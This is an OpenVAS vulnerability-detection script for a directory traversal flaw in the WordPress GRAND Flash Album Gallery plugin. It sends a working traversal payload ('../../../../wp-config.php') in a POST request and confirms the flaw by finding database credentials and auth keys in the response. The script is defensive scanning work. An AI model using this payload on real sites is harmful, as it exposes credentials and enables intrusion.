###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 7161 2017-09-18 07:43:57Z cfischer $
#
# WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to read arbitrary
files via directory traversal attacks and gain sensitive information via SQL
Injection attack.

Impact Level: Application";

tag_affected = "WordPress GRAND Flash Album Gallery Version 0.55.";

tag_insight = "The flaws are due to
- input validation error in 'want2Read' parameter to 'wp-content/plugins/
  flash-album-gallery/admin/news.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.
- improper validation of user-supplied input via the 'pid' parameter to
  'wp-content/plugins/flash-album-gallery/lib/hitcounter.php', which allows
  attackers to manipulate SQL queries by injecting arbitrary SQL code.";

tag_solution = "Upgrade to version 1.76 or later,
For updates refer to http://wordpress.org/extend/plugins/flash-album-gallery";

tag_summary = "This host is installed with WordPress GRAND Flash Album Gallery
Plugin and is prone to multiple vulnerabilities.";

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802015");
  script_version("$Revision: 7161 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-18 09:43:57 +0200 (Mon, 18 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43648/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16947/");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/file_content_disclosure_in_grand_flash_album_gallery_wordpress_plugin.html");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

host = http_host_name( port:port );

## Post Data
postData = "want2Read=..%2F..%2F..%2F..%2Fwp-config.php&submit=submit";
path = dir + "/wp-content/plugins/flash-album-gallery/admin/news.php";

## Construct attack post request
req = string("POST ", path, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData),
             "\r\n\r\n", postData);

## Send post request and Receive the response
res = http_send_recv(port:port, data:req);

## Check for patterns present in wp-config.php file in the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) && "DB_NAME" ><
   res && "DB_USER" >< res && "DB_PASSWORD" >< res && "AUTH_KEY" >< res)
{
  security_message(port);
}
